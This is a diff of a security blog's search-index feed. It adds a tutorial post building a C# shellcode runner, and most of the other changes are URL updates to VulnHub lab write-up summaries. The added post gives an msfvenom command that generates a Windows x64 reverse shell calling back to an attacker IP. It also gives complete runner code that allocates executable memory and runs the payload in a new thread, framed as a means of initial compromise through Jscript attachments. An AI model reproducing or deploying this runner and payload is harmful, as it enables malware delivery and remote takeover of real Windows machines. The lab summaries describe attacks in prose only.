@@ -4,9 +4,22 @@
   
     
     <entry>
+      <title>C# Shellcode Runner</title>
+      <link href="/posts/CSharp-Shellcode-Runner/"/>
+      <url>/posts/CSharp-Shellcode-Runner/</url>
+      
+        <content type="html"><![CDATA[<p>Learning about initial compromise techniques… </p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Besides Microsoft Office VBA macros, another popular way for initial compromise is using Javascript attachments. Specifically, the <em>Jscript</em> file format can be used to execute Javascript on Windows targets through the Windows Script Host (WSH). A common method of compromise involves using the Jscript file to load a pre-compiled C# assembly to execute shellcode. This all happens in memory and does not touch the disk. Here, we will develop the foundations of a C# shellcode runner.</p><h1 id="C-Win32-API-Calls"><a href="#C-Win32-API-Calls" class="headerlink" title="C# Win32 API Calls"></a>C# Win32 API Calls</h1><p>In order to use C# to execute our shellcode, we need to leverage a few Windows operating system APIs (Win32 APIs) that will help us load our payload into memory to be executed. These APIs are located in dynamic link libraries (DLLs) that run as unmanaged code. We will need to use <em>DllImport</em> statements in order to link these for use in our C# code.</p><p>Let’s create a little program that imports and uses <em>MessageBox</em> to create a simple text box to familiarize ourselves to these APIs.</p><h2 id="Simple-C-Program"><a href="#Simple-C-Program" class="headerlink" title="Simple C# Program"></a>Simple C# Program</h2><p>There are two ways to create C# .NET programs - <a href="https://www.mono-project.com/">Mono</a> and <a href="https://visualstudio.microsoft.com/">Visual Studio</a>. We will use Visual Studio. </p><p>Open up VS and create new project with the <em>Console App (.NET Framework)</em> template.<br><img src="/posts/CSharp-Shellcode-Runner/image-20230911144141484.png"></p><p>We should get some sample code like this:<br><img src="/posts/CSharp-Shellcode-Runner/image-20230911144323747.png"></p><p>To use <em>MessageBox</em>, we will look up its signature on <a href="http://www.pinvoke.net/">pinvoke.net</a> to help us get the C# import statement:</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">DllImport(<span class="string">&quot;user32.dll&quot;</span>, SetLastError = true, CharSet= CharSet.Auto)</span>] <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="built_in">int</span> <span class="title">MessageBox</span>(<span class="params">IntPtr hWnd, String text, String caption, <span class="built_in">uint</span> type</span>)</span>;</span><br></pre></td></tr></table></figure><p>Add this import statement inside our <em>Program</em> class right above <em>Main</em> to utilize the <code>MessageBox</code> method inside our code.<br><img src="/posts/CSharp-Shellcode-Runner/image-20230911144630962.png"></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.InteropServices;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">ConsoleApp1</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        [<span class="meta">DllImport(<span class="string">&quot;user32.dll&quot;</span>, SetLastError = true, CharSet = CharSet.Auto)</span>] <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="built_in">int</span> <span class="title">MessageBox</span>(<span class="params">IntPtr hWnd, String text, String caption, <span class="built_in">uint</span> type</span>)</span>;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            MessageBox(IntPtr.Zero, <span class="string">&quot;Hello World!&quot;</span>, <span class="string">&quot;Goodbye World!&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Build and run the program, and we should get a simple message box.<br><img src="/posts/CSharp-Shellcode-Runner/image-20230911144809497.png"></p><h1 id="C-Shellcode-Runner"><a href="#C-Shellcode-Runner" class="headerlink" title="C# Shellcode Runner"></a>C# Shellcode Runner</h1><h2 id="The-Three-APIs"><a href="#The-Three-APIs" class="headerlink" title="The Three APIs"></a>The Three APIs</h2><p>Now that we’re familiar with the basic usage of Win32 APIs, we can continue to develop our shellcode runner. For the runner to work as intended, we need APIs to allocate memory for our shellcode and execute it. We will utilize the <em>VirtualAlloc</em>, <em>CreateThread</em>, and <em>WaitForSingleObject</em> APIs to achieve this.</p><p>First, we’ll look up the signatures of these APIs on pinvoke.net:</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>] <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">VirtualAlloc</span>(<span class="params">IntPtr lpAddress, <span class="built_in">uint</span> dwSize, <span class="built_in">uint</span> flAllocationType, <span class="built_in">uint</span> flProtect</span>)</span>; </span><br><span class="line">[<span class="meta">DllImport(<span class="string">&quot;kernel32&quot;</span>, CharSet = CharSet.Ansi)</span>] <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">CreateThread</span>(<span class="params">IntPtr lpThreadAttributes, <span class="built_in">uint</span> dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, <span class="built_in">uint</span> dwCreationFlags, IntPtr lpThreadId</span>)</span>;</span><br><span class="line">[<span class="meta">DllImport(<span class="string">&quot;kernel32.dll&quot;</span>, SetLastError = true)</span>] <span class="function"><span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">WaitForSingleObject</span>(<span class="params">IntPtr hHandle, UInt32 dwMilliseconds</span>)</span>;</span><br></pre></td></tr></table></figure><p>Next, we’ll generate our shellcode. Note that Jscript executes in 64-bit context by default on a 64-bit Windows machine, so we’ll generate a simple 64-bit staged reverse shell in <code>msfvenom</code> and output it in <code>csharp</code> format.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.248.140 LPORT=4444 -f csharp</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No <span class="built_in">arch</span> selected, selecting <span class="built_in">arch</span>: x64 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 460 bytes</span><br><span class="line">Final size of csharp file: 2368 bytes</span><br><span class="line">byte[] buf = new byte[460] &#123;0xfc,0x48,0x83,0xe4,0xf0,0xe8,...&#125;</span><br></pre></td></tr></table></figure><p>Finally, we make the calls to the three APIs to load our shellcode in memory and execute it by:</p><ol><li>Allocating space for our shellcode (<em>buf</em>) with <em>VirtualAlloc</em></li><li>Copying our shellcode into the allocated memory space with <em>Marshal.Copy</em> - which is part of the <em>System.Runtime.InteropServices</em> namespace that copies data from a managed array to an unmanaged memory pointer.</li><li>Execute the shellcode in another thread using <em>CreateThread</em>.</li><li>Finally, waiting for the thread to finish execution with <em>WaitForSingleObject</em>.</li></ol><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">byte</span>[] buf = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">460</span>] &#123;<span class="number">0xfc</span>,<span class="number">0x48</span>,<span class="number">0x83</span>,<span class="number">0xe4</span>,<span class="number">0xf0</span>,<span class="number">0xe8</span>,...&#125;;</span><br><span class="line"><span class="built_in">int</span> size = buf.Length;</span><br><span class="line">IntPtr addr = VirtualAlloc(IntPtr.Zero, <span class="number">0x1000</span>, <span class="number">0x3000</span>, <span class="number">0x40</span>);</span><br><span class="line">Marshal.Copy(buf, <span class="number">0</span>, addr, size);</span><br><span class="line">IntPtr hThread = CreateThread(IntPtr.Zero, <span class="number">0</span>, addr, IntPtr.Zero, <span class="number">0</span>, IntPtr.Zero);</span><br><span class="line">WaitForSingleObject(hThread, <span class="number">0xFFFFFFFF</span>);</span><br></pre></td></tr></table></figure><h2 id="Final-Code"><a href="#Final-Code" class="headerlink" title="Final Code"></a>Final Code</h2><p>Putting all this together, we get:</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.InteropServices;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">ConsoleApp1</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        [<span class="meta">DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>] <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">VirtualAlloc</span>(<span class="params">IntPtr lpAddress, <span class="built_in">uint</span> dwSize, <span class="built_in">uint</span> flAllocationType, <span class="built_in">uint</span> flProtect</span>)</span>; </span><br><span class="line">        [<span class="meta">DllImport(<span class="string">&quot;kernel32&quot;</span>, CharSet = CharSet.Ansi)</span>] <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">CreateThread</span>(<span class="params">IntPtr lpThreadAttributes, <span class="built_in">uint</span> dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, <span class="built_in">uint</span> dwCreationFlags, IntPtr lpThreadId</span>)</span>;</span><br><span class="line">        [<span class="meta">DllImport(<span class="string">&quot;kernel32.dll&quot;</span>, SetLastError = true)</span>] <span class="function"><span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">WaitForSingleObject</span>(<span class="params">IntPtr hHandle, UInt32 dwMilliseconds</span>)</span>;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">byte</span>[] buf = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">460</span>] &#123; <span class="number">0xfc</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xe4</span>, <span class="number">0xf0</span>, <span class="number">0xe8</span>, ...&#125;;</span><br><span class="line">            <span class="built_in">int</span> size = buf.Length;</span><br><span class="line">            IntPtr addr = VirtualAlloc(IntPtr.Zero, <span class="number">0x1000</span>, <span class="number">0x3000</span>, <span class="number">0x40</span>);</span><br><span class="line">            Marshal.Copy(buf, <span class="number">0</span>, addr, size);</span><br><span class="line">            IntPtr hThread = CreateThread(IntPtr.Zero, <span class="number">0</span>, addr, IntPtr.Zero, <span class="number">0</span>, IntPtr.Zero);</span><br><span class="line">            WaitForSingleObject(hThread, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>When compiling this project, remember to set the CPU arch to x64. </p><p><img src="/posts/CSharp-Shellcode-Runner/image-20230911151931850.png"></p><p><img src="/posts/CSharp-Shellcode-Runner/image-20230911151740933.png"></p><p>Finally, setting up a simple <code>netcat</code> listener as our handler and executing the compiled binary, we should get a reverse shell back.</p><p><img src="/posts/CSharp-Shellcode-Runner/image-20230911152308804.png"></p><p>As expected though, the binary will be picked up by AV software very easily.<br><img src="/posts/CSharp-Shellcode-Runner/image-20230911152753878.png"></p><p>Will flesh out AV evasion ideas in <a href="/posts/AV-Evasion">AV-Evasion</a>.</p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>VulnHub - Djinn1</title>
-      <link href="/2022/06/21/VulnHub-Djinn1/"/>
-      <url>/2022/06/21/VulnHub-Djinn1/</url>
+      <link href="/posts/VulnHub-Djinn1/"/>
+      <url>/posts/VulnHub-Djinn1/</url>
       
         <content type="html"><![CDATA[<h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>The target machine is running an <code>FTP</code> server that allows for <code>anonymous</code> login, granting access to three text files that indicate port <code>1337</code> is open. This is a rabbit hole (as I found out half an hour in trying to write a python program to solve it…). A deeper <code>nmap</code> enumeration will reveal that port <code>7331</code> is also open, which turns out to be a web application. Enumerating this website, we come upon a page that allows for command executions. It has some weak filtering (which we bypass by <code>base64</code> encoding our payload to get a reverse shell). On the target machine, we gain access to a <code>creds.txt</code> file in user <code>nitish</code>‘s home directory, which we use to <code>SSH</code> into. As <code>nitish</code>, we are able to run a <code>sudo</code> program as user <code>sam</code>. After a few trials, we are able to gain a shell as <code>sam</code>, who can run a program as <code>root</code> using <code>sudo</code>. Eventually, exploiting a <code>python</code> <code>input()</code> insecurity vulnerability, we are able to gain a root shell.</p>]]></content>
       
@@ -38,8 +51,8 @@
     
     <entry>
       <title>VulnHub - Digitalworld.local (Mercy v2)</title>
-      <link href="/2022/06/16/VulnHub-Digitalworld-local-Mercy-v2/"/>
-      <url>/2022/06/16/VulnHub-Digitalworld-local-Mercy-v2/</url>
+      <link href="/posts/VulnHub-Digitalworld-local-Mercy-v2/"/>
+      <url>/posts/VulnHub-Digitalworld-local-Mercy-v2/</url>
       
         <content type="html"><![CDATA[<h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2>]]></content>
       
@@ -69,8 +82,8 @@
     
     <entry>
       <title>VulnHub - Digitalworld.local (Development)</title>
-      <link href="/2022/06/16/VulnHub-Digitalworld-local-Development/"/>
-      <url>/2022/06/16/VulnHub-Digitalworld-local-Development/</url>
+      <link href="/posts/VulnHub-Digitalworld-local-Development/"/>
+      <url>/posts/VulnHub-Digitalworld-local-Development/</url>
       
         <content type="html"><![CDATA[<h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2>]]></content>
       
@@ -100,8 +113,8 @@
     
     <entry>
       <title>VulnHub - Digitalworld.local (Bravery)</title>
-      <link href="/2022/06/15/VulnHub-Digitalworld-local-Bravery/"/>
-      <url>/2022/06/15/VulnHub-Digitalworld-local-Bravery/</url>
+      <link href="/posts/VulnHub-Digitalworld-local-Bravery/"/>
+      <url>/posts/VulnHub-Digitalworld-local-Bravery/</url>
       
         <content type="html"><![CDATA[<h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>The target is sharing multiple NFS mounts that we can access. Through enumeration of the public shares, we are able to find passwords for more secured shares. Ultimately, we find the location of an internal website built using <code>CuppaCMS</code>, which is vulnerable to LFI&#x2F;RFI, allowing us to initiate a reverse shell. For privilege escalation, we enumerate the local machine for <code>SUID</code> binaries and find that <code>cp</code> has <code>SUID</code> set. This allows us to make a copy of <code>/etc/passwd</code>, modify it (i.e add another privileged user), and then <code>cp</code> it back into <code>/etc/passwd</code>. After this, we should be able to login as the new user and gain a root shell.</p><h3 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h3><p>VulnHub Machine: <a href="https://www.vulnhub.com/entry/digitalworldlocal-bravery,281/">https://www.vulnhub.com/entry/digitalworldlocal-bravery,281/</a></p>]]></content>
       
@@ -133,8 +146,8 @@
     
     <entry>
       <title>VulnHub - Joy</title>
-      <link href="/2022/06/14/VulnHub-Joy/"/>
-      <url>/2022/06/14/VulnHub-Joy/</url>
+      <link href="/posts/VulnHub-Joy/"/>
+      <url>/posts/VulnHub-Joy/</url>
       
         <content type="html"><![CDATA[<h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>The target machine is running a <code>ProFTP</code> server that allows for anonymous logins with read&#x2F;write permissions. Reading through all the files in the FTP server, we discover a file named <code>version_control</code> in <code>/home/patrick</code>, however we are unable to retreive this file. After an aggressive scan for all UDP ports, we find that the target is also running <code>SNMP</code>, allowing us to use <code>snmpwalk</code> to enumerate for running processes. We find that the target is running <code>TFTP</code>, a file transfer protocol, with the root directory of <code>/home/patrick</code>. Using this information, we are able to retrieve the <code>version_control</code> file and identify version numbers of serveral services, one of which is <code>ProFTP 1.3.5</code>, which is vulnerable to a remote command execution vulnerability (CVE-2015–3306). After we craft an exploit for this vulnerability, we are able to get a reverse shell onto the system, running as user <code>www-data</code>. We directly escalate into user <code>patrick</code> after finding a file containing credentials in the <code>ossec</code> directory. As <code>patrick</code>, we can run a script as <code>sudo</code> that will change file permissions. We give write permissions to <code>/etc/passwd</code> and add a high privilege user to gain root. </p><h3 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h3><p>VulnHub Machine: <a href="https://www.vulnhub.com/entry/digitalworldlocal-joy,298/">https://www.vulnhub.com/entry/digitalworldlocal-joy,298/</a></p>]]></content>
       
@@ -166,8 +179,8 @@
     
     <entry>
       <title>VulnHub - DC-9</title>
-      <link href="/2022/04/29/DC-9/"/>
-      <url>/2022/04/29/DC-9/</url>
+      <link href="/posts/DC-9/"/>
+      <url>/posts/DC-9/</url>
       
         <content type="html"><![CDATA[<h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>The target machine is running a custum web application that is vulnerable to <code>SQLi</code>, leaking admin credentials to the website as well as credentials to several other users. Logging in as <code>admin</code>, we notice that <code>manage.php</code> is vulnerable to <code>LFI</code>, giving us the <code>port knocking</code> sequence to unlock <code>SSH</code>. With <code>SSH</code> unlocked, we use <code>hydra</code> to bruteforce logins with the leaked credentials we gathered earlier. We successfully login as user <code>janitor</code>, who has <code>sudo</code> access to an executable that can read and append to files. We use this to add a new high privileged user and get a root shell.</p><h2 id="WIP"><a href="#WIP" class="headerlink" title="WIP"></a>WIP</h2><h3 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h3><p>VulnHub Machine: <a href="https://www.vulnhub.com/entry/dc-9,412/">https://www.vulnhub.com/entry/dc-9,412/</a></p>]]></content>
       
@@ -187,11 +200,11 @@
             
             <tag> Bruteforce </tag>
             
-            <tag> Local File Inclusion (LFI) </tag>
-            
             <tag> Hydra </tag>
             
             <tag> Port Knocking </tag>
+            
+            <tag> Local File Inclusion (LFI) </tag>
             
             <tag> SQL Injection (SQLi) </tag>
             
@@ -203,8 +216,8 @@
     
     <entry>
       <title>VulnHub - DC-6</title>
-      <link href="/2022/04/24/DC-6/"/>
-      <url>/2022/04/24/DC-6/</url>
+      <link href="/posts/DC-6/"/>
+      <url>/posts/DC-6/</url>
       
         <content type="html"><![CDATA[<h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>The target is running <code>WordPress</code> and using the clue telling us to make a password list from rockyou.txt, we can safely assume that we’re supposed to bruteforce for WordPress users. We run <code>wpscan</code> to enumerate for users and use <code>hydra</code> to bruteforce and find a valid credential for user <code>mark</code>. We log into WordPress as <code>mark</code> and see that the <code>Activity Monitor</code> plugin is installed, which is vulnerable to a <code>Remote Code Execution</code> vulnerability, getting us a reverse shell. From here, we enumerate into user <code>mark</code>‘s home directory which contains a note with credentials for user <code>graham</code>. We <code>ssh</code> into <code>graham</code> and run <code>sudo -l</code> to discover that they can run a shell script as user <code>jens</code>. We modify this shell script and gain a shell as user <code>jens</code>. Running <code>sudo -l</code> one more time, we find that we can run <code>nmap</code> as <code>sudo</code> and using a command found on <code>GTFOBins</code>, we escalate into a root shell.</p><h3 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h3><p>VulnHub Machine: <a href="https://www.vulnhub.com/entry/dc-6,315/">https://www.vulnhub.com/entry/dc-6,315/</a></p>]]></content>
       
@@ -236,8 +249,8 @@
     
     <entry>
       <title>VulnHub - DC-5</title>
-      <link href="/2022/04/23/DC-5/"/>
-      <url>/2022/04/23/DC-5/</url>
+      <link href="/posts/DC-5/"/>
+      <url>/posts/DC-5/</url>
       
         <content type="html"><![CDATA[<h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>The target is running a custom webpage. After we send in a contact request in <code>contact.php</code>, we get redirected to <code>thankyou.php</code>. We notice that the footer in the <code>thankyou.php</code> page changes. We use <code>gobuster</code> to look for <code>php</code> files and find <code>footer.php</code>. Now, we can safely surmise that <code>thankyou.php</code> is probably including <code>footer.php</code> somehow - perhaps from an unknown parameter? We use <code>wfuzz</code> to look for this parameter and find that <code>thankyou.php</code> takes the <code>file</code> parameter, resulting in a LFI vulnerability. Using LFI, we can log poison the <code>/var/nginx/log/error.log</code> file by passing a php reverse shell into the <code>file</code> parameter, letting the system log it as error, and then LFI to view the error log to gain a shell back. From here, we find that <code>/bin/screen-4.5.0</code> has SUID set and is vulnerable to a local priv esc exploit. We exploit this manually and obtain a root shell.</p><h3 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h3><p>VulnHub Machine: <a href="https://www.vulnhub.com/entry/dc-4,313/">https://www.vulnhub.com/entry/dc-4,313/</a></p>]]></content>
       
@@ -257,11 +270,11 @@
             
             <tag> Easy </tag>
             
+            <tag> Local File Inclusion (LFI) </tag>
+            
             <tag> Log Poisoning </tag>
             
             <tag> Nginx </tag>
-            
-            <tag> Local File Inclusion (LFI) </tag>
             
         </tags>
       
@@ -271,8 +284,8 @@
     
     <entry>
       <title>VulnHub - DC-4</title>
-      <link href="/2022/04/23/DC-4/"/>
-      <url>/2022/04/23/DC-4/</url>
+      <link href="/posts/DC-4/"/>
+      <url>/posts/DC-4/</url>
       
         <content type="html"><![CDATA[<h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>The target is running a custom web application named <code>Admin Information Systems Login</code>. We take this to mean that we have to bruteforce for the <code>admin</code> user via POST requests to <code>login.php</code>. We use <code>wfuzz</code> to perform this and find valid credentials. After logging in, we are greeted to <code>command.php</code> which runs simple commands like <code>ls -l</code> or <code>whoami</code>. We hi-jack these requests to make it execute arbitrary commands, and use this to gain a low level shell onto the machine. After some local enumeration, we find old passwords for the user <code>jim</code> and use <code>hydra</code> to bruteforce into <code>ssh</code>. After logging in as <code>jim</code>, we find a mail in <code>/var/mail</code> with user <code>charles</code>‘s password. We <code>su</code> into <code>charles</code> and discover he can run <code>teehee</code> as <code>sudo</code>. We abuse this privilege and insert a new user with <code>uid=0</code> into <code>/etc/passwd/</code> and <code>su</code> into that user to gain a root shell.</p><h3 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h3><p>VulnHub Machine: <a href="https://www.vulnhub.com/entry/dc-4,313/">https://www.vulnhub.com/entry/dc-4,313/</a></p>]]></content>
       
@@ -302,8 +315,8 @@
     
     <entry>
       <title>VulnHub - DC-3</title>
-      <link href="/2022/04/22/DC-3/"/>
-      <url>/2022/04/22/DC-3/</url>
+      <link href="/posts/DC-3/"/>
+      <url>/posts/DC-3/</url>
       
         <content type="html"><![CDATA[<h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>The target machine is running <code>Joomla! 3.7.0</code> which is vulnerable to an SQLi exploit, providing us with an easily crackable hash for the <code>admin</code> user. Logging in as <code>admin</code>, we perform a <code>Joomla!</code> template injection to gain a low-priv <code>www-data</code> shell. From here, we enumerate the machine and uncover that it’s running Linux Kernel <code>4.4.0-21</code>, which has several vulnerabilities that can be used to gain a root shell.</p><h3 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h3><p>VulnHub Machine:  <a href="https://www.vulnhub.com/entry/dc-32,312/">https://www.vulnhub.com/entry/dc-32,312/</a></p>]]></content>
       
@@ -333,8 +346,8 @@
     
     <entry>
       <title>VulnHub - DC-2</title>
-      <link href="/2022/04/22/DC-2/"/>
-      <url>/2022/04/22/DC-2/</url>
+      <link href="/posts/DC-2/"/>
+      <url>/posts/DC-2/</url>
       
         <content type="html"><![CDATA[<h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>The target machine is running a <code>WordPress</code> site with a post that suggests we use <code>cewl</code> to scrape for passwords. Along with that, we use <code>wpscan</code> to identify users <code>tom</code> and <code>jerry</code>. Then, we use <code>hydra</code> to bruteforce the login and find valid credentials for both users. We <code>ssh</code> into the machine as <code>tom</code> and are greeted to a <code>rbash</code>, which we escape using <code>vi</code>. Then, we <code>su</code> to <code>jerry</code> and discover that they can run <code>git</code> as <code>sudo</code>. Finally, we escalate using a <code>sudo git</code> command detailed on <code>GTFOBins</code>. </p><h3 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h3><p>VulnHub Machine:  <a href="https://www.vulnhub.com/entry/dc-2,311/">https://www.vulnhub.com/entry/dc-2,311/</a></p>]]></content>
       
@@ -368,8 +381,8 @@
     
     <entry>
       <title>VulnHub - DC-1</title>
-      <link href="/2022/04/22/DC-1/"/>
-      <url>/2022/04/22/DC-1/</url>
+      <link href="/posts/DC-1/"/>
+      <url>/posts/DC-1/</url>
       
         <content type="html"><![CDATA[<h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>The target machine is running <code>Drupal 7</code> - vulnerable to the <code>&#39;Drupalgeddon2&#39; Remote Code Execution</code> exploit, which we utilize to gain a reverse shell as low-priv <code>www-data</code> user. From here, we enumerate the machine and discover that the <code>find</code> command has <code>SUID</code> set. We utilize the <code>find</code> command along with its <code>-exec</code> option to read the contents of the final flag.</p><h3 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h3><p>VulnHub Machine:  <a href="https://www.vulnhub.com/entry/dc-1,292/">https://www.vulnhub.com/entry/dc-1,292/</a></p>]]></content>
       
